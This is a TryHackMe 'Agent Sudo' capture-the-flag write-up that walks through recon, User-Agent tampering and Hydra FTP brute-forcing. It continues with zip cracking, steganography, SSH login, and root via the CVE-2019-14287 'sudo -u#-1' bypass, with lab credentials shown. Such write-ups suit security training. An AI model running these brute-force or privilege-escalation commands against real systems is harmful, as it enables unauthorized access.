
# Tryhackme Agent Sudo: Writeup

## Reconnaissance

### Nmap Scan  
We started with an `nmap` scan and discovered the following open ports:

| Port | Service |
|-------|---------|
| 21    | FTP     |
| 22    | SSH     |
| 80    | HTTP    |

---

## Web Enumeration

- We explored the web server (port 80) and used **Burp Suite** to modify the `User-Agent` header.
- After trying different agents, **Agent C** revealed the username:  
  ```
  Agent C's name is: chris
  ```

---

## FTP Brute-force

- We performed an FTP brute-force attack using **Hydra**:
  ```bash
  hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.130.39
  ```
- Found credentials:
  ```
  chris:crystal
  ```

---

## FTP Loot

Logged into FTP and found:
```
To_agentJ.txt  
cute-alien.jpg  
cutie.png
```
We downloaded all the files for analysis.

---

## File Analysis

### To_agentJ.txt  
- The note mentioned that a password was hidden in one of the images.

### cutie.png  
- Ran `binwalk`:
  ```bash
  binwalk cutie.png
  ```
- Found embedded files:
  ```
  365
  365.zlib
  8702.zip
  To_agentR.txt
  ```

### Crack 8702.zip  
- Extracted hash for **John the Ripper**:
  ```bash
  zip2john 8702.zip > new.txt
  john new.txt
  ```
- Password found:
  ```
  alien
  ```

- Extracted zip:
  ```bash
  7z e 8702.zip
  ```
- Found:
  ```
  To_agentR.txt
  ```
- The note revealed a steghide passphrase:
  ```
  steg password: Area51
  ```

---

## Steganography

- Extracted data from `cute-alien.jpg`:
  ```bash
  steghide extract -sf cute-alien.jpg
  ```
- Found `message.txt`:
  ```
  The message is to James.
  His login password is: hackerrules!
  ```

---

## SSH Access

- Logged in via SSH:
  ```bash
  ssh james@10.10.130.39
  ```
- Found `user.txt`:
  ```
  b03d975e8c92a7c0414*************
  ```

- Noticed `Alien_autospy.jpg`, searched online and found:
  ```
  Roswell
  ```

---

## Privilege Escalation

- Checked `sudo -l`:
  ```
  (ALL, !root) /bin/bash
  ```

- Identified vulnerability: **CVE-2019-14287**

- Exploited with:
  ```bash
  sudo -u#-1 /bin/bash
  ```
- Got root shell.

- Found `root.txt`:
  ```
  b53a02f55b57d4439e3*************
  ```

- Agent R’s name:
  ```
  DesKel
  ```

---

## Summary of Flags

| Flag Type | Hash |
|------------|----------------------------------|
| User Flag  | `b03d975e8c92a7c041**************` |
| Root Flag  | `b53a02f55b57d4439e**************` |
